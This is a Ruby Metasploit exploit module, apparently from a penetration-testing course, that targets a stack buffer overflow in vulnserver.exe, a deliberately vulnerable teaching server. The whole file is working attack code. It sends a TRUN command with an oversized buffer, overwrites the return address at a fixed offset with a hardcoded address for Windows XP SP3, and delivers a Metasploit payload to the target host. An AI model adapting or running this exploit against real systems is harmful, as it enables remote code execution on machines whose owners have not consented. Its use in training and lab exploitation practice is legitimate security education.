#
#
# Quick Metasploit exploit for vulnserver.exe
# Written by: Joe McCray
# Email: joe@strategicsec.com
#
# Place this exploit in:
# /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
#
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	include Msf::Exploit::Remote::Tcp
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Custom vulnerable server stack overflow',
			'Description'    => %q{
				This module exploits a stack overflow in an app called 
				vulnserver that is designed to teach simple exploitation.
				},
			'Author'         => [ 'Joe McCray' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20",
				},
			'Platform'       => 'win',

			'Targets'        =>
				[
					[
						'Windows XP SP3 EN',
							{ 
								'Ret' => 0x625011AF, 
							} 
					],
				],
			'DefaultTarget' => 0,

			'Privileged'     => false
			))

			register_options(
			[
				Opt::RPORT(9999)
			], self.class)
	end

	def exploit
		connect
		sock.recv(1024)

		p =  "\x41" * 16
		p << payload.encoded

		hdr =  "TRUN ."
		boom = pattern_create(3000)
		boom[2006, 4] = [target.ret].pack('V')	# EIP value
		boom[2010, p.length] = p

		sploit = hdr + boom

		sock.put(sploit)

		handler
		disconnect

	end

end
